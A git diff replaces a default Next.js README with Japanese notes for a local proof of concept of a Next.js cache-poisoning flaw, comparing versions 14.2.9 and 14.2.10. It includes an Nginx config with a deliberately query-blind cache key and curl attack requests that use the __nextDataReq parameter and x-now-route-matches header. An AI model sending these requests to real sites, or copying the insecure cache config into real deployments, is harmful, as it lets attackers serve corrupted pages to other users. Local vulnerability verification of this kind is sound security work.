@@ -1,40 +1,129 @@
-This is a [Next.js](https://nextjs.org/) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
+# Next.js Cache Poisoning ローカル検証メモ
 
-## Getting Started
+このリポジトリは、Pages Router + SSR (`getServerSideProps`) を使った
+ローカル検証用PoCです。
 
-First, run the development server:
+## 前提
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
+- Next.js: `14.2.9`（修正前）または `14.2.10`（修正後）
+- Burp Suite（任意）
+- Docker Desktop（Nginxをコンテナで起動する場合）
+
+## なぜ `npm run dev` だけでは再現しにくいか
+
+- 脆弱性の本質は「中間キャッシュ層」が不適切なキーで保存することです。
+- ローカルのNext.js単体では、永続的な共有キャッシュが無いため、
+	ポイズニングの再現が難しいです。
+- さらに開発モードのレスポンスはキャッシュされにくいため、
+	検証は `next build && next start`（本番モード）で行うのを推奨します。
+
+## このPoCページ
+
+[pages/index.tsx](pages/index.tsx) は以下を表示します。
+
+- `User-Agent`
+- サーバ側生成時刻 `Generated At (Server)`
+
+`Generated At` が固定されたまま返ると、キャッシュヒットを視認しやすくなります。
+
+## 1. Next.jsを本番モードで起動
+
+```powershell
+npm install
+npm run build
+npm run start
 ```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+Next.jsは `http://localhost:3000` で待ち受けます。
 
-You can start editing the page by modifying `pages/index.tsx`. The page auto-updates as you edit the file.
+## 2. Nginxキャッシュ層を起動
 
-[API routes](https://nextjs.org/docs/api-routes/introduction) can be accessed on [http://localhost:3000/api/hello](http://localhost:3000/api/hello). This endpoint can be edited in `pages/api/hello.ts`.
+設定ファイルは [nginx/nginx.conf](nginx/nginx.conf) です。
 
-The `pages/api` directory is mapped to `/api/*`. Files in this directory are treated as [API routes](https://nextjs.org/docs/api-routes/introduction) instead of React pages.
+Dockerで次のエラーが出る場合は、Docker Desktopが未起動です。
 
-This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-optimization) to automatically optimize and load Inter, a custom Google Font.
+failed to connect to the docker API at npipe:////./pipe/docker_engine
 
-## Learn More
+その場合はDocker Desktopを起動し、`docker desktop status` が `running` を返すことを確認してから続行してください。
 
-To learn more about Next.js, take a look at the following resources:
+ポイント:
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+- `proxy_cache_key "$host$uri";`
+	- クエリをキーに含めない（脆弱な設定例）
+- `proxy_ignore_headers ...;`
+	- PoCとしてキャッシュを強制
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js/) - your feedback and contributions are welcome!
+```powershell
+docker run --name next-cache-poc --rm -d -p 8080:8080 `
+  -v "${PWD}\nginx\nginx.conf:/etc/nginx/conf.d/default.conf:ro" `
+  nginx:1.27
+```
 
-## Deploy on Vercel
+以降は `http://localhost:8080` にアクセスします。
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+同名コンテナ競合エラーが出た場合:
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/deployment) for more details.
+```powershell
+docker stop next-cache-poc
+docker rm next-cache-poc
+```
+
+一発で作り直す場合:
+
+```powershell
+docker rm -f next-cache-poc
+docker run --name next-cache-poc --rm -d -p 8080:8080 `
+	-v "${PWD}\nginx\nginx.conf:/etc/nginx/conf.d/default.conf:ro" `
+	nginx:1.27
+```
+
+## 3. 検証手順（攻撃リクエスト送信）
+
+Burp Suite でも curl でも可能です。例として curl:
+
+```powershell
+curl.exe -i "http://localhost:8080/?__nextDataReq=1" `
+  -H "x-now-route-matches: 1" `
+  -H "User-Agent: poison-agent"
+```
+
+期待値:
+
+- JSON形式レスポンス
+- `userAgent` が `poison-agent`
+- `X-Cache-Status: MISS`（初回）
+
+同じURIに再アクセス:
+
+```powershell
+curl.exe -i "http://localhost:8080/" -H "User-Agent: victim-agent"
+```
+
+脆弱な経路でキャッシュ汚染が成立する場合、次が観測できます。
+
+- 本来HTMLのはずのレスポンスがJSONで返る
+- `userAgent` が `poison-agent` のまま
+- `X-Cache-Status: HIT`
+
+## 4. 14.2.9 / 14.2.10 比較
+
+`package.json` の `next` を切り替えて比較します。
+
+```powershell
+npm install next@14.2.9 eslint-config-next@14.2.9
+npm run build
+npm run start
+```
+
+```powershell
+npm install next@14.2.10 eslint-config-next@14.2.10
+npm run build
+npm run start
+```
+
+同一手順で、レスポンス差分（JSON化の可否、キャッシュHIT挙動）を確認します。
+
+## 注意
+
+- この検証はローカル環境でのみ実施してください。
+- 外部システムへの攻撃的テストは、明示的な許可無しに行わないでください。
